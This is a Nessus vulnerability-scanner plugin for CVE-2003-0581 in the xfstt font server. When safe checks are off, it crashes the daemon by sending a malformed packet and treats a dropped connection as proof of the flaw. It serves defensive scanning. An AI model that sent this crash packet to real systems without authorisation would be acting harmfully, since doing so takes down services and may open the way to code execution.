#
# (C) Tenable Network Security, Inc.
#

# Ref:
#  Date: Tue, 15 Jul 2003 00:38:20 +0200
#  From: ruben unteregger <ruben.unteregger@era-it.ch>
#  To: bugtraq@securityfocus.com
#  Subject: xfstt-1.4 vulnerability

include("compat.inc");

if (description)
{
 script_id(11814);
 script_version("$Revision: 1.20 $");
 script_cvs_date("$Date: 2016/11/01 19:59:57 $");

 script_cve_id("CVE-2003-0581");
 script_bugtraq_id(8182);
 script_osvdb_id(11803);
 script_xref(name:"Secunia", value:"9271");

 script_name(english:"TrueType Font Server for X11 (xfstt) Malformed Packet Remote Overflow");
 script_summary(english:"Crashes the remote xfstt daemon");

 script_set_attribute(attribute:"synopsis", value:
"The font service running on the remote host has a remote buffer
overflow vulnerability.");
 script_set_attribute(attribute:"description", value:
"The remote X Font Service for TrueType (xfstt) is vulnerable to a
remote buffer overflow which may lead to code execution as root or a
denial of service.");
 #https://web.archive.org/web/20070213221523/http://archives.neohapsis.com/archives/bugtraq/2003-07/0178.html
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?6f06337d");
 script_set_attribute(attribute:"solution", value:"Upgrade to the latest version of xfstt.");
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");

 script_set_attribute(attribute:"vuln_publication_date", value:"2003/07/14");
 script_set_attribute(attribute:"plugin_publication_date", value:"2003/08/01");

 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_end_attributes();

 script_category(ACT_MIXED_ATTACK);
 script_family(english:"Gain a shell remotely");
 script_copyright(english:"This script is Copyright (C) 2003-2016 Tenable Network Security, Inc.");

 script_require_ports(7101);

 exit(0);
}


include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");

kb = known_service(port:7101);
if(kb && kb != "xfs")exit(0);



port = 7101;

if(safe_checks())
{
 if (report_paranoia < 2) audit(AUDIT_PARANOID);
 if(get_port_state(port))
 {
  soc = open_sock_tcp(port);
  if(soc)
  {
   close(soc);
   report = string(
     "*** Note that Nessus did not actually check for the flaw since\n",
     "*** safe checks are enabled, so this might be a false positive.\n"
   );

   security_hole(port:port, extra:report);
  }
 }
 exit(0);
}

if(!get_port_state(port))exit(0);

soc = open_sock_tcp(port);
if(!soc)exit(0);
send(socket:soc, data:raw_string('l', 0, 11, 0, 6, 0, 0, 0));
r = recv(socket:soc, length:28);
if(!r)exit(0);
send(socket:soc, data:raw_string(17, 0, 8, 0) + raw_string(17) + crap(length:32, data:raw_string(0x00)));
r = recv(socket:soc, length:16);
if(strlen(r))
{
 close(soc);
 soc = open_sock_tcp(port);
 if(!soc)exit(0);
 send(socket:soc, data:raw_string('l', 0, 11, 0, 6, 0, 0, 0));

 r = recv(socket:soc, length:28);
 if(!r)exit(0);
 send(socket:soc, data:raw_string(17, 0, 8, 0) + raw_string(17) + crap(length:32, data:raw_string(0x7F)));
 r = recv(socket:soc, length:16);
 if(!r)security_hole(port);
}
